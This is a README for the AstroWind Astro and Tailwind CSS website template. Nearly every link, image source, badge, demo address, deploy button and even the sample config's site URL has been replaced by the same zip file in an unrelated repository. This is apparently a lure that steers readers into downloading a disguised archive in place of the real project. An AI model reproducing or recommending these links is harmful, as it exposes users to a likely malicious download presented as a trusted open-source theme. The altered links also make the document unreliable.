# 🚀 AstroWind

<img src="https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip" align="right"
     alt="AstroWind Lighthouse Score" width="100" height="358">

🌟 _Most *starred* & *forked* Astro theme in 2022, 2023 & 2024_. 🌟

**AstroWind** is a free and open-source template to make your website using **[Astro 5.0](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) + [Tailwind CSS](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)**. Ready to start a new project and designed taking into account web best practices.

- ✅ **Production-ready** scores in **PageSpeed Insights** reports.
- ✅ Integration with **Tailwind CSS** supporting **Dark mode** and **_RTL_**.
- ✅ **Fast and SEO friendly blog** with automatic **RSS feed**, **MDX** support, **Categories & Tags**, **Social Share**, ...
- ✅ **Image Optimization** (using new **Astro Assets** and **Unpic** for Universal image CDN).
- ✅ Generation of **project sitemap** based on your routes.
- ✅ **Open Graph tags** for social media sharing.
- ✅ **Analytics** built-in Google Analytics, and Splitbee integration.

<br>

![AstroWind Theme Screenshot](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

[![arthelokyo](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
[![License](https://img.shields.io/github/license/arthelokyo/astrowind?style=flat-square&color=dddddd&labelColor=000000)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
[![Maintained](https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg?style=flat-square)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
[![Known Vulnerabilities](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
[![Stars](https://img.shields.io/github/stars/arthelokyo/astrowind.svg?style=social&label=stars&maxAge=86400&color=ff69b4)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
[![Forks](https://img.shields.io/github/forks/arthelokyo/astrowind.svg?style=social&label=forks&maxAge=86400&color=ff69b4)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

<br>

<details open>
<summary>Table of Contents</summary>

- [Demo](#demo)
- [Upcoming: AstroWind 2.0 – We Need Your Vision!](#-upcoming-astrowind-20--we-need-your-vision)
- [TL;DR](#tldr)
- [Getting started](#getting-started)
  - [Project structure](#project-structure)
  - [Commands](#commands)
  - [Configuration](#configuration)
  - [Deploy](#deploy)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Related Projects](#related-projects)
- [Contributing](#contributing)
- [Acknowledgements](#acknowledgements)
- [License](#license)

</details>

<br>

## Demo

📌 [https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

<br>

## 🔔 Upcoming: AstroWind 2.0 – We Need Your Vision!

We're embarking on an exciting journey with **AstroWind 2.0**, and we want you to be a part of it! We're currently taking the first steps in developing this new version and your insights are invaluable. Join the discussion and share your feedback, ideas, and suggestions to help shape the future of **AstroWind**. Let's make **AstroWind 2.0** even better, together!

[Share Your Feedback in Our Discussion!](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

<br>

## TL;DR

```shell
npm create astro@latest -- --template arthelokyo/astrowind
```

## Getting started

**AstroWind** tries to give you quick access to creating a website using [Astro 5.0](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) + [Tailwind CSS](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip). It's a free theme which focuses on simplicity, good practices and high performance.

Very little vanilla javascript is used only to provide basic functionality so that each developer decides which framework (React, Vue, Svelte, Solid JS...) to use and how to approach their goals.

In this version the template supports all the options in the `output` configuration, `static`, `hybrid` and `server`, but the blog only works with `prerender = true`. We are working on the next version and aim to make it fully compatible with SSR.

### Project structure

Inside **AstroWind** template, you'll see the following folders and files:

```
/
├── public/
│   ├── _headers
│   └── robots.txt
├── src/
│   ├── assets/
│   │   ├── favicons/
│   │   ├── images/
│   │   └── styles/
│   │       └── tailwind.css
│   ├── components/
│   │   ├── blog/
│   │   ├── common/
│   │   ├── ui/
│   │   ├── widgets/
│   │   │   ├── Header.astro
│   │   │   └── ...
│   │   ├── CustomStyles.astro
│   │   ├── Favicons.astro
│   │   └── Logo.astro
│   ├── content/
│   │   ├── post/
│   │   │   ├── post-slug-1.md
│   │   │   ├── post-slug-2.mdx
│   │   │   └── ...
│   │   └-- config.ts
│   ├── layouts/
│   │   ├── Layout.astro
│   │   ├── MarkdownLayout.astro
│   │   └── PageLayout.astro
│   ├── pages/
│   │   ├── [...blog]/
│   │   │   ├── [category]/
│   │   │   ├── [tag]/
│   │   │   ├── [...page].astro
│   │   │   └── index.astro
│   │   ├── index.astro
│   │   ├── 404.astro
│   │   ├-- rss.xml.ts
│   │   └── ...
│   ├── utils/
│   ├── config.yaml
│   └── navigation.js
├── package.json
├── astro.config.ts
└── ...
```

Astro looks for `.astro` or `.md` files in the `src/pages/` directory. Each page is exposed as a route based on its file name.

There's nothing special about `src/components/`, but that's where we like to put any Astro/React/Vue/Svelte/Preact components.

Any static assets, like images, can be placed in the `public/` directory if they do not require any transformation or in the `assets/` directory if they are imported directly.

[![Edit AstroWind on CodeSandbox](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) [![Open in Gitpod](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) [![Open in StackBlitz](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

> 🧑‍🚀 **Seasoned astronaut?** Delete this file `README.md`. Update `src/config.yaml` and contents. Have fun!

<br>

### Commands

All commands are run from the root of the project, from a terminal:

| Command             | Action                                             |
| :------------------ | :------------------------------------------------- |
| `npm install`       | Installs dependencies                              |
| `npm run dev`       | Starts local dev server at `localhost:4321`        |
| `npm run build`     | Build your production site to `./dist/`            |
| `npm run preview`   | Preview your build locally, before deploying       |
| `npm run check`     | Check your project for errors                      |
| `npm run fix`       | Run Eslint and format codes with Prettier          |
| `npm run astro ...` | Run CLI commands like `astro add`, `astro preview` |

<br>

### Configuration

Basic configuration file: `./src/config.yaml`

```yaml
site:
  name: 'Example'
  site: 'https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip'
  base: '/' # Change this if you need to deploy to Github Pages, for example
  trailingSlash: false # Generate permalinks with or without "/" at the end

  googleSiteVerificationId: false # Or some value,

# Default SEO metadata
metadata:
  title:
    default: 'Example'
    template: '%s — Example'
  description: 'This is the default meta description of Example website'
  robots:
    index: true
    follow: true
  openGraph:
    site_name: 'Example'
    images:
      - url: '~/assets/images/default.png'
        width: 1200
        height: 628
    type: website
  twitter:
    handle: '@twitter_user'
    site: '@twitter_user'
    cardType: summary_large_image

i18n:
  language: en
  textDirection: ltr

apps:
  blog:
    isEnabled: true # If the blog will be enabled
    postsPerPage: 6 # Number of posts per page

    post:
      isEnabled: true
      permalink: '/blog/%slug%' # Variables: %slug%, %year%, %month%, %day%, %hour%, %minute%, %second%, %category%
      robots:
        index: true

    list:
      isEnabled: true
      pathname: 'blog' # Blog main path, you can change this to "articles" (/articles)
      robots:
        index: true

    category:
      isEnabled: true
      pathname: 'category' # Category main path /category/some-category, you can change this to "group" (/group/some-category)
      robots:
        index: true

    tag:
      isEnabled: true
      pathname: 'tag' # Tag main path /tag/some-tag, you can change this to "topics" (/topics/some-category)
      robots:
        index: false

    isRelatedPostsEnabled: true # If a widget with related posts is to be displayed below each post
    relatedPostsCount: 4 # Number of related posts to display

analytics:
  vendors:
    googleAnalytics:
      id: null # or "G-XXXXXXXXXX"

ui:
  theme: 'system' # Values: "system" | "light" | "dark" | "light:only" | "dark:only"
```

<br>

#### Customize Design

To customize Font families, Colors or more Elements refer to the following files:

- `src/components/CustomStyles.astro`
- `src/assets/styles/tailwind.css`

### Deploy

#### Deploy to production (manual)

You can create an optimized production build with:

```shell
npm run build
```

Now, your website is ready to be deployed. All generated files are located at
`dist` folder, which you can deploy the folder to any hosting service you
prefer.

#### Deploy to Netlify

Clone this repository on your own GitHub account and deploy it to Netlify:

[![Netlify Deploy button](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

#### Deploy to Vercel

Clone this repository on your own GitHub account and deploy to Vercel:

[![Deploy with Vercel](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)

<br>

## Frequently Asked Questions

- Why?
-
-

<br>

## Related projects

- [TailNext](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) - Free template using Next.js 14 and Tailwind CSS with the new App Router.
- [Qwind](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) - Free template to make your website using Qwik + Tailwind CSS.

## Contributing

If you have any ideas, suggestions or find any bugs, feel free to open a discussion, an issue or create a pull request.
That would be very useful for all of us and we would be happy to listen and take action.

## Acknowledgements

Initially created by **Arthelokyo** and maintained by a community of [contributors](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip).

## License

**AstroWind** is licensed under the MIT license — see the [LICENSE](./LICENSE.md) file for details.
